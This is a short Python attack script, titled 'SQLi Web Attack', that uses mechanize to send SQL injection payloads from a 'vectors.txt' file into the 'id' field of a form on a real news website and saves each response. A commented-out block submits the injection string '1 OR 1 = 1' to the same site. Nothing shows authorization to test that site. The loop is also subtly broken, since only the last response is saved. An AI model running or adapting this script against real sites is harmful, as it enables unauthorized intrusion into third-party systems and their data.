"""SQLi Web Attack."""

import mechanize


url = "https://www.politico.com/tipsheets/morning-money"
attack_no = 1
browser = mechanize.Browser()

with open('vectors.txt') as v:
    for line in v:
        browser.open(url)
        browser.select_form(nr=0)
        browser['id'] = line
        res = browser.submit()
    content = res.read()

    output = open('penetration/' + str(attack_no) + '.txt', 'w')
    output.write(content)
    output.close()
    print(attack_no)
    attack_no += 1
# ------------------------------------------------------------------- #
# url = "https://www.politico.com/tipsheets/morning-money"
# request = mechanize.Browser()
# request.open(url)
# request.select_form(nr=0)
# request["id"] = "1 OR 1 = 1"
#
# response = request.submit()
# content = response.read()
# print(content)
